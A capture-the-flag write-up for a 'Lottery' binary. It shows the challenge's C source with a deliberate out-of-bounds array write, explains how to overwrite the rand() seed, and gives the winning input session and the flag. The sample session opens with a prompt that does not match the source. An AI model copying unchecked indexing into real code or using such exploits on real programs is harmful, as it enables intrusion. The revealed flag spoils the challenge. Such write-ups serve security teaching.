# Lottery
For this challenge we need to do a bit of reverse engineering to understand what the binary does and what values it uses.
This reverse engineering can be done with the help of a number of tools such as Ghidra, Binja, IDA or just plain old objdump.

However for this writeup we will simply look at the original source code. The code that we are interested in is the following:

```C
int nums[6] = {};
int guesses[6] = {};
unsigned long seed = 0;

void lotto() {
	srand(seed);
	for (int i = 0; i < 6; i++) {
		nums[i] = rand() % 3274;
	}

	int index;
	for (int i = 0; i < 6; i++) {
		puts("What index are you guessing?");
		index = getint();
		puts("What number is it?");
		guesses[index] = getint(); // Out of bounds write
	}

	for (int i = 0; i < 6; i++) {
		if (nums[i] != guesses[i]) {
			puts("You lost\n\n\n\n");
			return;
		}
	}
	win();
	return;
}

int main() {
    seed = time(NULL);
	int num;
	puts("How many lottery tickets do you want?");
	num = getint();
	for (int i = 0; i < num; i++) {
		lotto();
	}
	return 0;
}
```

Immediately we notice that we can play as many times as we want and we control the index that we are guessing. This means we can write out of bounds of the `guesses` array, allowing us to overwrite the `seed` variable. So if we play the lottery two times, the first time we overwrite the `seed` value and guess random numbers. The second time we know the value of `seed` so we can pre-calculate the randomly generated values, using the following `C` program:

```C
#include <stdio.h>

int main() {
    srand(1337);
    for (int i = 0; i < 6; i++) {
        printf("%d\n", rand() % 3274);
    }
    return 0;
}
```

Which gives us:
```
2931
890
979
221
596
1214
```

So if we input the following, we will get the flag:

```
What index are you guessing?
How many lottery tickets do you want?
2
What index are you guessing?
6
What number is it?
1337
What index are you guessing?
7
What number is it?
1337
What index are you guessing?
0
What number is it?
1337
What index are you guessing?
1
What number is it?
1337
What index are you guessing?
2
What number is it?
1337
What index are you guessing?
4
What number is it?
1337
You lost




What index are you guessing?
0   
What number is it?
2931
What index are you guessing?
1
What number is it?
890
What index are you guessing?
2
What number is it?
979
What index are you guessing?
3
What number is it?
221
What index are you guessing?
4
What number is it?
596
What index are you guessing?
5
What number is it?
1214
Here is your flag: gg{W1n_th3_j4ckp0t!}
```
